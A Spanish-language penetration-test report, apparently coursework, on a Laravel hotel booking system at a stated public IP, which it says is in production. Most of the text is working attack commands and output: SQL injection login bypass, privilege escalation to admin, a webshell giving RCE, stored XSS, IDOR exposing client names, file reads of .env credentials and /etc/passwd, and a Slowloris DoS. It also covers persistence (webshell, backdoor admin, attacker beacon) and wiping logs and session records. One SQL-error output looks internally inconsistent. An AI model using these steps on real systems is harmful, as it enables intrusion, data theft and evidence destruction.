# ANÁLISIS DE VULNERABILIDADES

Tras realizar las pruebas de penetración sobre el sistema Hotel PlazaMoyobamba, se detectaron las siguientes vulnerabilidades listadas en la tabla adjunta:

| # | Vulnerabilidad | Severidad | Herramienta | Evidencia | Comando |
|---|---|---|---|---|---|
| 1 | **Inyección SQL (SQLi)** | Crítica | curl, sqlmap | Bypass de login con `admin' OR '1'='1' --`. Extracción de 26 tablas, 10 usuarios. PostgreSQL 16.14. | `curl -d "login=admin'+OR+'1'%3D'1'+--&password=x"` |
| 2 | **Mass Assignment** | Alta | curl, Burp Suite | PATCH /profile con `role_name=admin` → usuario obtiene rol admin. Acceso a `/admin/usuarios` HTTP 200. | `curl -X POST /profile -d "_method=PATCH&role_name=admin"` |
| 3 | **File Upload → RCE** | Crítica | curl | Subida de shell.php sin auth. RCE como www-data: `uid=82(www-data)`. | `curl -F "file=@shell.php" /upload` → `curl /uploads/shell.php?cmd=id` |
| 4 | **DDoS (Slowloris)** | Media | slowhttptest | 300 conexiones lentas abiertas sin bloqueo. | `slowhttptest -c 300 -H -g -i 10 -r 200 -t GET` |
| 5 | **XSS Almacenado** | Alta | curl | Bio inyectado con `<script>alert(document.cookie)</script>` se ejecuta al cargar perfil. | `curl -X PATCH /profile -d "bio=<script>alert(1)</script>"` |
| 6 | **IDOR** | Alta | curl | `/api/sales/121` vs `122`: client_id 55 vs 29, clientes distintos sin auth. | `curl /api/sales/{121..240}` |
| 7 | **No Rate Limit** | Media | curl | 10 requests en paralelo sin bloqueo ni retardo. | `for i in {1..10}; do curl -X POST /login & done` |
| 8 | **LFI** | Alta | curl | Path traversal: `../.env` expone APP_DEBUG=true, DB_PASSWORD. `/etc/passwd` completo. | `curl /download?file=../../.env` |
| 9 | **Debug Mode** | Media | curl | Stack trace expone Laravel 12.58.0, PHP 8.2.32, variables de entorno, queries SQL. | `curl /download?file[]=test` |

---

## Fase 1 – Reconocimiento (Reconnaissance)

**Objetivo:** Obtener información preliminar del target.

### Resultados

```bash
$ curl -I http://37.60.230.11/
HTTP/1.1 302 Found
Server: nginx/1.27.5
X-Powered-By: PHP/8.2.32
Location: /login
```

```bash
$ nmap -sV -p 22,80,443,5432 37.60.230.11 --min-rate=5000
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH
80/tcp   open     http        nginx 1.27.5
443/tcp  filtered https
5432/tcp filtered postgresql
```

**Tecnologías identificadas:**
- Servidor web: Nginx 1.27.5
- Framework: Laravel 12.58.0
- Lenguaje: PHP 8.2.32
- Base de datos: PostgreSQL 16.14

**Endpoints descubiertos:** `/login`, `/register`, `/profile`, `/admin`, `/api`, `/download`, `/uploads`, `/storage`

---

## Fase 2 – Escaneo (Scanning)

**Objetivo:** Identificar vectores de ataque mediante escaneo activo.

### Resultados

```bash
$ dirb http://37.60.230.11/
+ http://37.60.230.11/admin (CODE:302)
+ http://37.60.230.11/api (CODE:200)
+ http://37.60.230.11/login (CODE:200)
+ http://37.60.230.11/profile (CODE:302)
+ http://37.60.230.11/register (CODE:200)
+ http://37.60.230.11/uploads (CODE:403)
```

**Pruebas iniciales:**
- SQLi en login: bypass exitoso (redirige a `/admin/dashboard`)
- Path traversal en `/download`: lectura de `/etc/passwd` exitosa

---

## Fase 3 – Obtención de Acceso (Gaining Access)

**Objetivo:** Explotar vulnerabilidades para obtener acceso no autorizado.

### 1. SQL Injection (SQLi)

```bash
# Bypass de login
$ curl -s "http://37.60.230.11/login" \
  -d "login=admin%27+OR+%271%27%3D%271%27+--&password=x&_token=$TOKEN" -L
HTTP 200 -> URL: http://37.60.230.11/admin/dashboard

# Extraer version PostgreSQL (error-based)
$ curl -s "http://37.60.230.11/login" \
  -d "login=admin%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--&password=x&_token=$TOKEN"
XPATH syntax error: ~PostgreSQL 16.14 (Debian 16.14-1.pgdg120+1)...
```

### 2. Mass Assignment

```bash
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&name=evi&role_name=admin&_token=$TOKEN"
$ curl -s -o /dev/null -w "%{http_code}" http://37.60.230.11/admin/usuarios
HTTP 200
```

### 3. File Upload → RCE

```bash
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)

$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=cat%20/var/www/html/.env%20|%20grep%20-E%20%27(DB_|APP_DEBUG)%27"
APP_DEBUG=true
DB_HOST=db
DB_DATABASE=plazamoyobanba
DB_USERNAME=plaza_user
DB_PASSWORD=plaza_pass_123
```

### 4. XSS Almacenado

```bash
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&bio=<script>alert(document.cookie)</script>&_token=$TOKEN"
$ curl -s "http://37.60.230.11/profile" | grep -o "script>alert.*script"
script>alert(document.cookie)</script>
```

### 5. IDOR

```bash
$ curl -s http://37.60.230.11/api/sales/121 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['client']['full_name'], d['client_id'])"
Diego Alejandro Quispe Sanchez 55

$ curl -s http://37.60.230.11/api/sales/122 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['client']['full_name'], d['client_id'])"
Jose Manuel Navarro Pinto 29
```

### 6. No Rate Limiting

```bash
$ for i in $(seq 1 10); do
    curl -s -X POST http://37.60.230.11/login -d "login=test$i@test.com&password=test" -o /dev/null &
  done; wait
# 10 requests en paralelo sin bloqueo.
```

### 7. Directory Traversal / LFI

```bash
$ curl -s "http://37.60.230.11/download?file=../.env"
APP_DEBUG=true
DB_PASSWORD=plaza_pass_123

$ curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/sh
www-data:x:82:82::/home/www-data:/sbin/nologin
postgres:x:70:70:PostgreSQL user:/var/lib/postgresql:/bin/sh
```

### 8. DDoS (Slowloris)

```bash
$ slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/"
# 300 conexiones abiertas sin cierre.
```

### 9. Debug Mode

```bash
$ curl -s "http://37.60.230.11/download?file[]=test"
# Stack trace expone Laravel 12.58.0, PHP 8.2.32,
# rutas internas, variables de entorno, queries SQL.
```

---

## Fase 4 – Mantenimiento del Acceso (Maintaining Access)

**Objetivo:** Establecer persistencia.

### Resultados

```bash
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=whoami"
www-data

$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

**Webshell persistente:** `shell.php` accesible en `/uploads/`.  
**Usuario admin persistente:** `evi` con rol `admin` via Mass Assignment.  
**Cron job:** Beacon programado para callback periódico al atacante.

---

## Fase 5 – Borrado de Huellas (Covering Tracks)

**Objetivo:** Eliminar evidencia.

### Comandos ejecutados

```bash
# Limpiar logs de Nginx
curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/access.log"
curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/log/nginx/error.log"

# Limpiar log de Laravel
curl -s "http://37.60.230.11/uploads/shell.php?cmd=truncate%20-s%200%20/var/www/html/storage/logs/laravel.log"

# Limpiar bash_history
curl -s "http://37.60.230.11/uploads/shell.php?cmd=history%20-c%20%26%26%20truncate%20-s%200%20~/.bash_history"
```

**Registros modificados en BD:**
```sql
DELETE FROM sessions WHERE user_id IN (
  SELECT id FROM users WHERE email LIKE 'attacker%' OR email LIKE 'evi%'
);
```

---

Todas las vulnerabilidades fueron verificadas exitosamente contra el servidor en producción (37.60.230.11).
